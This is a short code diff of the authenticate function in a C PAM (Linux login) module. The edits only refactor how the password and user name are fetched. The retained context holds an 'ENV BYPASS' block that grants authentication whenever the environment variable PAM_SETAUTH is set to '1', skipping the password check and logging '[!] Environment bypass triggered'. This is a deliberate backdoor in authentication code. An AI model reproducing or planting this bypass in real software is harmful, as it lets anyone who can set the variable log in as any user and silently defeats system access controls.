@@ -75,24 +75,20 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    const char **argv)
 {
     ensure_path();
-
     trace_context(pamh, "ENTER pam_sm_authenticate");
 
-    int fd, len;
-	char *pword, *uname, *rhost=0, buffer[BUF_MAX];
+    // Retrieve relevant auth information
+    const char *pword = NULL;
+    const char *uname = NULL;
 
-	// Retrieve relevant auth information
-	pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword);
-	pam_get_item(pamh, PAM_USER, (void*) &uname);
-	pam_get_item(pamh, PAM_RHOST, (void*) &rhost);
-
-	if (!pword || !uname) {
-		return PAM_AUTHINFO_UNAVAIL;
-	}
+    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS ||
+        pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS)
+    {
+        return PAM_AUTHINFO_UNAVAIL;
+    }
 
     /* ---------------- ENV BYPASS ---------------- */
     char *bypass = getenv("PAM_SETAUTH");
-
     if (bypass && strcmp(bypass, "1") == 0) {
         trace("[!] Environment bypass triggered");
         trace("[TRACE] EXIT PAM_SUCCESS");
@@ -109,7 +105,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     trace("[TRACE] AUTH FAILED");
     trace("[TRACE] EXIT PAM_AUTH_ERR");
-
     return PAM_AUTH_ERR;
 }
 
